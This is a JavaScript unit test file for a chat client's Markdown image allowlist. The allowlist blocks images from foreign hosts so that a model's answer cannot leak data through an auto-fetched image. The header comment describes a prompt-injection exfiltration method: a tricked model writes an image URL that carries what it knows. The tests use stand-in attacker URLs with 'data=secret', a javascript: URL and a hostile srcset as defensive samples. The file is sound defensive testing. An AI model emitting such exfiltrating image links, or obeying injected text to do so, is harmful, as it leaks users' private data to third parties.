// Unit tests for the Markdown image allowlist both chat clients apply (CoreAIImages).
//
// A model's answer is rendered as Markdown, and an image in it makes the browser fetch its address on its own. Text the
// model was tricked into writing, or read out of a document it was given, can put what it knows in that address --
// ![](https://attacker.example/pixel?data=...) -- and the visitor's browser sends it as soon as the answer is shown. So an
// image is only drawn when it comes from the page's own origin, an allowlisted host, or is a data or blob image that
// makes no request; any other image is shown as a plain link the visitor must choose to follow.
//
// The rules are statements about strings, so they run in a bare sandbox with no browser and no DOM.
//
// Run with: node --test tests/realtime-client/image-allowlist.test.js
const test = require('node:test');
const assert = require('node:assert');
const fs = require('node:fs');
const path = require('node:path');
const vm = require('node:vm');

const assetsDirectory = path.join(__dirname, '../../src/Resources/CrestApps.AI.Resources/Assets/js');
const BASE = 'https://chat.example.test/chat/page';

function loadImages(extra = {}) {
    const sandbox = { window: {}, URL, ...extra };

    vm.runInNewContext(fs.readFileSync(path.join(assetsDirectory, 'chat-markers.js'), 'utf8'), sandbox);

    const images = sandbox.window.CoreAIImages;
    assert.ok(images && typeof images.isAllowedSource === 'function', 'chat-markers.js does not expose CoreAIImages.isAllowedSource');

    return images;
}

function allowed(src, allowedHosts) {
    return loadImages().isAllowedSource(src, { allowedHosts, baseUrl: BASE });
}

test('a same-origin image is allowed with no configuration', () => {
    assert.strictEqual(allowed('/ai/documents/1/figures/2'), true);
    assert.strictEqual(allowed('figure.png'), true);
    assert.strictEqual(allowed('https://chat.example.test/figure.png'), true);
});

test('an image on another host is refused when the allowlist is empty or missing', () => {
    assert.strictEqual(allowed('https://attacker.example/pixel?data=secret'), false);
    assert.strictEqual(allowed('https://attacker.example/pixel?data=secret', []), false);
    assert.strictEqual(allowed('http://attacker.example/pixel', undefined), false);
});

test('a protocol-relative address is judged by the host it names, not as relative', () => {
    assert.strictEqual(allowed('//attacker.example/pixel'), false);
    assert.strictEqual(allowed('//cdn.example.test/pixel', ['cdn.example.test']), true);
});

test('an allowlisted host is allowed, and only that host', () => {
    const hosts = ['images.example.test'];

    assert.strictEqual(allowed('https://images.example.test/a.png', hosts), true);
    assert.strictEqual(allowed('https://IMAGES.example.test/a.png', hosts), true);
    assert.strictEqual(allowed('https://other.example.test/a.png', hosts), false);
    assert.strictEqual(allowed('https://images.example.test.attacker.example/a.png', hosts), false);
    assert.strictEqual(allowed('https://attacker.example/images.example.test/a.png', hosts), false);
});

test('a wildcard entry allows subdomains but not the bare domain', () => {
    const hosts = ['*.cdn.example.test'];

    assert.strictEqual(allowed('https://a.cdn.example.test/x.png', hosts), true);
    assert.strictEqual(allowed('https://a.b.cdn.example.test/x.png', hosts), true);
    assert.strictEqual(allowed('https://cdn.example.test/x.png', hosts), false);
    assert.strictEqual(allowed('https://evilcdn.example.test/x.png', hosts), false);
});

test('an allowlist entry written as an address is read as its host', () => {
    assert.strictEqual(allowed('https://images.example.test/a.png', ['https://images.example.test/some/path']), true);
});

test('data and blob images make no request and are allowed; other schemes are not', () => {
    assert.strictEqual(allowed('data:image/png;base64,iVBORw0KGgo='), true);
    assert.strictEqual(allowed('blob:https://chat.example.test/0b9f'), true);
    assert.strictEqual(allowed('blob:https://attacker.example/0b9f'), false);
    assert.strictEqual(allowed('data:text/html;base64,PGh0bWw+'), false);
    assert.strictEqual(allowed('javascript:alert(1)'), false);
    assert.strictEqual(allowed('ftp://chat.example.test/a.png'), false);
});

test('nothing is allowed for an empty or unreadable address', () => {
    assert.strictEqual(allowed(''), false);
    assert.strictEqual(allowed(null), false);
    assert.strictEqual(allowed('http://'), false);
});

test('a refused image is shown as a plain link with its text escaped', () => {
    const images = loadImages();
    const html = images.linkHtml('https://attacker.example/pixel?a=1&b=2', 'a <b>"picture"</b>');

    assert.strictEqual(html, '<a href="https://attacker.example/pixel?a=1&amp;b=2" target="_blank" rel="noopener noreferrer">a &lt;b&gt;&quot;picture&quot;&lt;/b&gt;</a>');
    assert.ok(!html.includes('<img'), 'a link must never contain an image');
});

test('a refused image with no text shows its address as the link text', () => {
    const images = loadImages();

    assert.match(images.linkHtml('https://attacker.example/p.png', ''), />https:\/\/attacker\.example\/p\.png<\/a>$/);
});

test('with no usable address the text is shown and nothing is linked', () => {
    const images = loadImages();

    assert.strictEqual(images.linkHtml('', 'caption <x>'), 'caption &lt;x&gt;');
});

// An <img> written as raw HTML in the answer never goes through the Markdown image renderer, so the sanitizer step has
// to apply the same rule. The sanitizer is faked: the point is which images its hook lets stay.
test('sanitize replaces a raw <img> from another host with a link, and keeps an allowed one', () => {
    const created = [];
    const document = {
        createElement(tag) {
            const element = { tag, attributes: {}, textContent: '', setAttribute(name, value) { this.attributes[name] = value; } };
            created.push(element);

            return element;
        }
    };
    const images = loadImages({ document });
    let hook = null;
    const purify = {
        addHook(name, callback) {
            assert.strictEqual(name, 'afterSanitizeAttributes');
            hook = callback;
        },
        removeHook(name) {
            assert.strictEqual(name, 'afterSanitizeAttributes');
            hook = null;
        },
        sanitize(html) {
            const outside = imageNode('https://attacker.example/p.png?data=secret', 'alt text');
            const inside = imageNode('https://chat.example.test/ok.png', 'ok');

            hook(outside);
            hook(inside);

            assert.ok(outside.replacement, 'the image from another host was not replaced');
            assert.strictEqual(outside.replacement.tag, 'a');
            assert.strictEqual(outside.replacement.attributes.href, 'https://attacker.example/p.png?data=secret');
            assert.strictEqual(outside.replacement.textContent, 'alt text');
            assert.strictEqual(inside.replacement, undefined, 'an allowed image was replaced');

            return '<sanitized>' + html;
        }
    };

    const result = images.sanitize(purify, '<img>', { ADD_TAGS: ['canvas'] }, { allowedHosts: [], baseUrl: BASE });

    assert.strictEqual(result, '<sanitized><img>');
    assert.strictEqual(hook, null, 'the hook stayed registered and would apply to every later sanitize call');
});

test('sanitize removes srcset, which could load a second address, from an image that stays', () => {
    const images = loadImages({ document: { createElement: () => ({ setAttribute() { } }) } });
    let hook = null;
    const purify = {
        addHook(_name, callback) { hook = callback; },
        removeHook() { hook = null; },
        sanitize() {
            const node = imageNode('https://chat.example.test/ok.png', 'ok');

            node.attributes.srcset = 'https://attacker.example/p.png 2x';
            hook(node);

            assert.strictEqual(node.attributes.srcset, undefined);

            return '';
        }
    };

    images.sanitize(purify, '', {}, { allowedHosts: [], baseUrl: BASE });
});

function imageNode(src, alt) {
    const node = {
        tagName: 'IMG',
        attributes: { src, alt },
        getAttribute(name) { return this.attributes[name] ?? null; },
        removeAttribute(name) { delete this.attributes[name]; },
        replaceWith(replacement) { this.replacement = replacement; }
    };

    return node;
}
